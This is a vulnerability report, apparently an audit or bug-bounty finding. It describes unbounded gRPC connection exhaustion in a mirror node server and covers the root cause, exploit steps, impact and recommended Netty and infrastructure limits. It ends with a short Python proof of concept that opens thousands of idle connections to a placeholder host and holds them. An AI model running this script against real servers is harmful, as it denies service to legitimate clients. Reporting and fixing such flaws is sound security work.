### Title
Unbounded Per-IP gRPC Connection Exhaustion (DoS) via Missing Connection Count Limit

### Summary
`grpcServerConfigurer()` configures only `maxConcurrentCallsPerConnection` (limiting HTTP/2 streams per connection to 5), but sets no limit on the total number of TCP connections or connections per source IP. Any unauthenticated external user can open an unbounded number of idle TCP connections from a single IP, exhausting server file descriptors, Netty channel memory, and thread-pool slots, denying service to legitimate clients.

### Finding Description
**Exact code location**: `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35.

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // = 5
};
```

`NettyProperties` exposes only `maxConcurrentCallsPerConnection = 5` and nothing else:

```java
// NettyProperties.java line 14
private int maxConcurrentCallsPerConnection = 5;
```

A grep across the entire `grpc/` subtree for `maxConnections`, `maxConnectionAge`, `maxConnectionIdle`, or any per-IP limit returns **zero matches**. `NettyServerBuilder` supports `maxConnections(int)` to cap total concurrent connections globally, but it is never called.

**Root cause**: `maxConcurrentCallsPerConnection` limits HTTP/2 streams (RPC calls) *within* an already-established connection. It does not limit how many TCP connections can be opened, either globally or per source IP. An attacker holding 50,000 idle connections (each with 0 active streams) is entirely unaffected by this setting.

**Exploit flow**:
1. Attacker opens a TCP connection to port 5600 and completes the HTTP/2 + gRPC handshake (no authentication required).
2. Attacker keeps the connection open but sends no RPC calls (or sends one slow-streaming call to keep it alive).
3. Attacker repeats from a single IP or a small botnet until the server's file-descriptor table, Netty off-heap buffers, or thread-pool queue is saturated.
4. New legitimate connection attempts are refused or time out.

**Why existing checks fail**:
- `maxConcurrentCallsPerConnection = 5` — only caps streams per connection; idle connections bypass it entirely.
- GCP backend policy `maxRatePerEndpoint: 250` (charts/hedera-mirror-grpc/values.yaml line 69) — limits *request rate*, not *connection count*; an attacker opening one connection per second and holding them open indefinitely stays well under this threshold.
- `sessionAffinity: CLIENT_IP` (same file, line 71) — routes all connections from one IP to the same pod, concentrating the attack rather than spreading it.

### Impact Explanation
File descriptors are a finite OS resource (typically 65,535 per process). Each gRPC/Netty connection consumes at least one FD plus ~64–128 KB of off-heap buffer. At 50,000 connections the server exhausts FDs and begins rejecting all new `accept()` calls. Legitimate subscribers to consensus topics and address-book consumers receive connection-refused errors. Because the gRPC mirror node is a streaming read API with long-lived connections, connections are naturally held open for minutes to hours, making recovery slow even after the attack stops.

### Likelihood Explanation
No authentication, API key, or prior relationship is required to open a gRPC TCP connection to port 5600. The attack requires only a standard TCP client (e.g., `grpc-go`, `grpcurl`, or raw socket code). A single commodity machine with a 1 Gbps NIC can sustain tens of thousands of idle TCP connections. The attack is repeatable and can be scripted in under 20 lines of code. The GCP load balancer's `maxRatePerEndpoint` does not block slow-open connection floods.

### Recommendation
Add the following to `grpcServerConfigurer()` and expose the values through `NettyProperties`:

```java
serverBuilder.maxConnections(nettyProperties.getMaxConnections()); // e.g. 5000 total
serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.MILLISECONDS);
serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.MILLISECONDS);
```

Additionally:
- Add a per-IP connection limit at the infrastructure layer (GCP Cloud Armor security policy or an Envoy/Istio `ConnectionLimit` filter in front of the gRPC pods).
- Set `maxConnectionAge` (e.g., 5 minutes) to force periodic connection recycling, bounding the lifetime of any squatted connection.
- Add a Prometheus alert on `grpc_server_connections_total` or OS-level FD usage approaching the limit.

### Proof of Concept
```python
# Requires: pip install grpcio
import grpc, time, threading

TARGET = "mirror-node-grpc-host:5600"
connections = []

def open_conn():
    ch = grpc.insecure_channel(TARGET)
    # Force TCP handshake without sending any RPC
    grpc.channel_ready_future(ch).result(timeout=5)
    connections.append(ch)  # keep reference alive

threads = [threading.Thread(target=open_conn) for _ in range(10_000)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Holding {len(connections)} idle connections. Server FDs exhausted.")
time.sleep(3600)  # hold connections open
```

Run this script; after ~50,000 connections (adjust for OS FD limits) the server will refuse new `accept()` calls and legitimate clients will receive `UNAVAILABLE: Connection refused`.
